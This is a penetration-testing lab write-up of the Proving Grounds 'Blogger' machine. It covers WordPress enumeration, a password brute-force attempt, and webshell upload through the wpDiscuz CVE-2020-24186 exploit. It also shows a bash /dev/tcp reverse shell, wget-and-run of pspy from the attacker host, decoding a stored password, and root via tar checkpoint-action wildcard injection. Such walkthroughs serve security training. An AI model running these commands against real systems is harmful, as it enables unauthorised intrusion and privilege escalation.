---
render_with_liquid: false
title: PG Play  Blogger
date: 2024-06-15 16:16:18 +1400
tags: [pg-play, nmap, linux, feroxbuster, wordpress, cms, wpscan, cve-2020-24186, wordpress-plugins, file-upload, php, discover-secrets, steganography, crypto, cyberchef, pspy, scheduled-job-abuse, tar-privesc, wildcards]
---



# Learnt / Summary

- Instead of using plugin exploits recommended by `wpscan`, just get the plugin's version then **google** to find most-used exploits

# Recon


## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ pt init '192.168.244.217 blogger.pg'
+---------+--------+-----------------+------------+
| PROFILE | STATUS |       IP        |   DOMAIN   |
+---------+--------+-----------------+------------+
| blogger | on     | 192.168.244.217 | blogger.pg |
+---------+--------+-----------------+------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sat Jun 15 16:16:18 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 192.168.244.217
Nmap scan report for 192.168.244.217
Host is up, received user-set (0.062s latency).
Scanned at 2024-06-15 16:16:18 CST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxOfkU+Q4dfPLCyiHlcl3+Rl8fCPL9YJ7GzzYAG8Vl75YbD21HXms6zE8KDBFuMu34+hvYCGxHIZVtZRMf9MFHdamqdx4YC++ZU7EFYy4eSQjPSukpIZOz4S4md5AmMFNucvvVOq9XVhWnxy86WSZzLO62y7ygqjG6w3sIXlrOjalqCUVgD60wnk53PW6Etkr6kpJwtrBXl60I6LOrb8hmTO63copeWbcYwi4OhlYAKV9EJjAFl9OohQX7uTR7uzoYPwaztG2HGQw/LQEQeV6KAfL+cb5QQMnP3ZW3r/nMKKZW3zw5h20sVaeoNcgVZ9ANv3EvldJqrRRG/R1wYJHV
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE6ost/PYmYfXkZxdW+XZSdvrXfTYifdCxxeASUc4llXCR9sRC0lxNP0AnjWlQq+xnAg95xDHNYSsNoPDaaqgHE=
|   256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNUmat0TujFtlTGYNCBEuh1P+MbsML6IJihp6I7mERS
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Blogger | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Jun 15 16:16:30 2024 -- 1 IP address (1 host up) scanned in 12.18 seconds
```

## 80 - HTTP : Blogger


### Info

```ruby
http://192.168.244.217 [200] [Blogger | Home] [Apache/2.4.18 (Ubuntu)] [bab647f17199aa7308f7a645315744fa798b0074] [Apache HTTP Server:2.4.18,Bootstrap,Ubuntu]
```

![](/assets/obsidian/e6999743dfea06ba0c5a38b03519cde2.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) --auto-tune -A -k -u "http://$(pt get rhost):80" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ cat ferox_80.txt | grep -vE '^404' | ff | grep '/blog/'
403      GET        0l        0w      280c http://192.168.244.217/assets/fonts/blog/.htm
200      GET      367l     1368w    22579c http://192.168.244.217/assets/fonts/blog/
301      GET        9l       28w      330c http://192.168.244.217/assets/fonts/blog => http://192.168.244.217/assets/fonts/blog/
301      GET        9l       28w      339c http://192.168.244.217/assets/fonts/blog/wp-admin => http://192.168.244.217/assets/fonts/blog/wp-admin/
301      GET        9l       28w      341c http://192.168.244.217/assets/fonts/blog/wp-content => http://192.168.244.217/assets/fonts/blog/wp-content/
301      GET        9l       28w      342c http://192.168.244.217/assets/fonts/blog/wp-includes => http://192.168.244.217/assets/fonts/blog/wp-includes/
```

# Initial Access


## Enumeration


### 80 - Wordpress

- Discovered a vhost : `blogger.pg`

> http://blogger.pg/assets/fonts/blog/

![](/assets/obsidian/8175315ca9cb4a14463b2015670309dd.png)

- I can view the blog normally after adding to hosts, the articlse are about common web vulnerabilities

![](/assets/obsidian/23e21879c10d752809c70f0b02351118.png)

## Shell as www-data


### 80 - Wordpress


#### Wpscan

```bash
wpscan --url "http://blogger.pg/assets/fonts/blog/" --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive --api-token '<API_TOMEN>' | tee wpscan.txt
```

- Focus on these sections : `Checking Plugin Versions (via Aggressive Methods)` and `Enumerating Users (via Passive and Aggressive Methods)`

First, brute force weak password on enumerated users to find low hanging fruits

![](/assets/obsidian/85f7a3b585414e2efc50cf214db69e2d.png)

- Unfortunately, no credentials found

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ cat users_wp.lst
j@m3s
jm3s

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ wpscan -t 50 --url http://blogger.pg/assets/fonts/blog/ -U users_wp.lst -P /usr/share/set/src/fasttrack/wordlist.txt
[...]
[i] No Valid Passwords Found.
[...]
```

Next, search for a plugin that have multiple high impact vulnerabilities

![](/assets/obsidian/900974c451e89bfa67fc552ce59161d8.png)

- Got plugin's version : `7.0.4`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ curl http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0=== Comments - wpDiscuz ===
Contributors: gVectors Team
Tags: comment, comments, ajax comments, comment form, comment fields
Requires at least: 5.0
Tested up to: 5.4
Stable tag: 7.0.4
Requires PHP: 5.4 and higher
License: GPLv3
License URI: https://www.gnu.org/licenses/gpl-3.0.html
```

#### WordPress Plugin wpDiscuz 7.0.4 - File upload bypass (Unauthenticated)

- Google : `wpdiscuz 7.0.4 exploit` to find popular exploits

> POC - https://www.exploit-db.com/exploits/49967

> **Brief exploit info**
> It uploads a php file with `GIF689a;` magic header in content to bypass file check
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/…/pg/play/Blogger/exploit]
└─$ searchsploit -m 49967
  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49967
     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
    Codes: CVE-2020-24186
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
Copied to: /home/kali/Offsec/pg/play/Blogger/exploit/49967.py
```

- The exploit needs `wordpress base URL` and `a post's relative path`

```bash
┌──(bravosec㉿fsociety)-[~/…/pg/play/Blogger/exploit]
└─$ python 49967.py
[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h
```

By clicking on the first blog post, got a url : `http://blogger.pg/assets/fonts/blog/?p=29`

![](/assets/obsidian/9715bedc8f26619a40d7efd73585f34f.png)

```bash
┌──(bravosec㉿fsociety)-[~/…/pg/play/Blogger/exploit]
└─$ python 49967.py -u http://blogger.pg/assets/fonts/blog/ -p "?p=29"
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
---------------------------------------------------------------

[+] Response length:[59354] | code:[200]
[!] Got wmuSecurity value: 72ed7c68e9
[!] Got wmuSecurity value: 29

[+] Generating random name for Webshell...
[!] Generated webshell name: tmedkezeolpapqg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/06/tmedkezeolpapqg-1718442855.9935.php&quot;

> id

[x] Failed to execute PHP code...
```

- Confirmed that the webshell was uploaded

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ curl http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/06/tmedkezeolpapqg-1718442855.9935.php?cmd=id
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a shell

```bash
nc -lvnp 1111
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ curl 'http://blogger.pg/assets/fonts/blog/wp-content/uploads/2024/06/tmedkezeolpapqg-1718442855.9935.php' --get --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.248/1111 0>&1"'
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.248] from (UNKNOWN) [192.168.244.217] 34354
bash: cannot set terminal process group (1357): Inappropriate ioctl for device
bash: no job control in this shell
<ress/assets/fonts/blog/wp-content/uploads/2024/06$ /usr/bin/script -qc /bin/bash /dev/null
<content/uploads/2024/06$ /usr/bin/script -qc /bin/bash /dev/null
<ress/assets/fonts/blog/wp-content/uploads/2024/06$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Blogger]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
024/06$ stty rows 50 columns 209wordpress/assets/fonts/blog/wp-content/uploads/20
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2024/06$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation


## From www-data to james


### Credential ciphered with rot47 and base64

- `/opt/.creds` contains a none sense string

```bash
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2024/06$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Jan 17  2021 .
drwxr-xr-x 25 root root 4096 Mar 23 09:57 ..
-rw-r--r--  1 root root  104 Jan 17  2021 .creds
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2024/06$ cat /opt/.creds
';u22>'v$)='2a#B&>`c'=+C(?5(|)q**bAv2=+E5s'+|u&I'vDI(uAt&=+(|`yx')Av#>'v%?}:#=+)';y@%'5(2vA!'<y$&u"H!"llwww-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2024/06$
```

- ROT47 (shift-based encryption cipher)

> https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13/disabled)ROT47(47)ROT8000(/disabled)&input=Jzt1MjI%2BJ3YkKT0nMmEjQiY%2BYGMnPStDKD81KHwpcSoqYkF2Mj0rRTVzJyt8dSZJJ3ZESSh1QXQmPSsofGB5eCcpQXYjPid2JT99OiM9KyknO3lAJSc1KDJ2QSEnPHkkJnUiSCEibGw

![](/assets/obsidian/155a369999c2c1c3a976aaa3631a03fd.png)

- Base64 (5 times)

> https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13/disabled)ROT47(47)ROT8000(/disabled)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Jzt1MjI%2BJ3YkKT0nMmEjQiY%2BYGMnPStDKD81KHwpcSoqYkF2Mj0rRTVzJyt8dSZJJ3ZESSh1QXQmPSsofGB5eCcpQXYjPid2JT99OiM9KyknO3lAJSc1KDJ2QSEnPHkkJnUiSCEibGw

![](/assets/obsidian/081a651f56d01a4e9a4dbaf6c141df84.png)

- Decoded result : `james:S3cr37_P@$$W0rd`

```bash
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2024/06$ su - james
Password:S3cr37_P@$$W0rd
james@ubuntu-xenial:~$ id
uid=1002(james) gid=1002(james) groups=1002(james)
```

## From james to root


### Crons - Bash script : Abuse wildcard in Tar command arguments

Run **pspy** to spy command lines

```bash
<ress/assets/fonts/blog/wp-content/uploads/2024/06$ FILE=pspy64; wget -q 192.168.45.248/$FILE -O /tmp/$FILE && chmod +x /tmp/$FILE && /tmp/$FILE &
```

- A cron job is running `/usr/local/bin/backup.sh`

![](/assets/obsidian/9d4ce6d6cc1fe36d067979b33b751196.png)

- There's a wildcard in `tar`'s arguments

```bash
james@ubuntu-xenial:~$ ls -la /usr/local/bin/backup.sh
-rwx---r-- 1 root root 54 Jan 17  2021 /usr/local/bin/backup.sh
james@ubuntu-xenial:~$ cat /usr/local/bin/backup.sh;echo

#!/bin/sh
cd /home/james/
tar czf /tmp/backup.tar.gz *
```

> Reference - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar

```bash
cd /home/james/
echo -e '#!/bin/bash\nchmod +s /bin/bash' > x
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh x'
```

![](/assets/obsidian/ff6cd94acfc3d46821e4ce3bf0e2cadf.png)

> When the script runs, the tar command will be `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh x *`, which will execute the script I created to give `bash` SUID bits

```bash
james@ubuntu-xenial:~$ bash -p
bash-4.3# id
uid=1002(james) gid=1002(james) euid=0(root) egid=0(root) groups=0(root),1002(james)
bash-4.3# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
bash-4.3# id
uid=0(root) gid=1002(james) egid=0(root) groups=0(root),1002(james)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/107972952be16c1fcc587b6d7edc49ed.png)

# Appendix

